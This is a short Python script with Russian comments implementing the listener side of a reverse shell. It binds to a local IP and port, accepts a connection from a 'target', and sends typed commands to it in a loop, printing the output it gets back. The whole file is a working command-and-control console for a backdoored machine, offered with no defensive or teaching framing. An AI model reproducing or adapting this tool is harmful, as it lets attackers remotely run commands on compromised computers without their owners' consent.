#!/usr/bin/python
import socket 
import json

#конвектирует данные пайтона в джейсон а его в свою очередь в байты
def reliable_send(data):
        json_data = json.dumps(data).encode()
        target.send(json_data)

#принимает большие данные по частям
def reliable_recv():
        json_data = b""
        while True:
                try:
                        json_data = json_data + target.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

#отправляет команды, завершает сеанс
def shell():
        while True:
                command = input("*Shell#~%s: " % str(ip))
                reliable_send(command)
                if command == "q":
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
                else:
                        result = reliable_recv()
                        print(result)

#подключение и прослушивание
def server():
        global s
        global ip
        global target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("192.168.178.67",54321))
        s.listen(1)
        target, ip = s.accept()

server()
shell()
s.close()
